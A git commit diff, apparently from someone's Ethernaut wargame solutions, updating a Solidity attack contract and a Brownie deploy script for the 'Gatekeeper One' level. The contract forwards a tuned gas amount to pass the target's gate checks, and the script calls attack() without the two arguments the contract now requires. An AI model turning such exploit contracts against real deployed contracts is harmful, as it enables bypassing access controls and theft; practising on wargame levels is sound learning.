e7d5ec33e6fcbff411d826f92a338bbe50545320
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-30 11:50:06 +0100

    update 13-deploy_attack.py

--- contracts/13-Gatekeeper-1/13-attack.sol
+++ contracts/13-Gatekeeper-1/13-attack.sol
@@ -5,13 +5,14 @@ import "./13-gatekeeper-1.sol";
 
 contract Attack13 {
     bytes8 public gateKey;
+    uint public gasAmount;
     GatekeeperOne public target;
 
     constructor(address _targetAddress) {
         target = GatekeeperOne(_targetAddress);
     }
 
-    function attack(bytes8 _gateKey) external {
-        target.enter(_gateKey);
+    function attack(bytes8 _gateKey, uint _gasAmount) external {
+        target.enter{gas: 8191 + _gasAmount}(_gateKey);
     }
 }
--- scripts/13-deploy_attack.py
+++ scripts/13-deploy_attack.py
@@ -4,12 +4,16 @@ from brownie import web3, interface, Attack13
 
 ETHERNAUT_INSTANCE = "0x52D9172066F788070Ca1F74A26F3aD2902282c37"
 GAS_LIMIT = 6000000
+GAS = 8191
 
 
 def main():
 
     player = get_account()
+    attack = Attack13.deploy(ETHERNAUT_INSTANCE, {"from": player})
     target = interface.IGatekeeperOne(ETHERNAUT_INSTANCE)
+
+    attack.attack()
 
     # check that we've won by confirming that 'entrant' = player
 
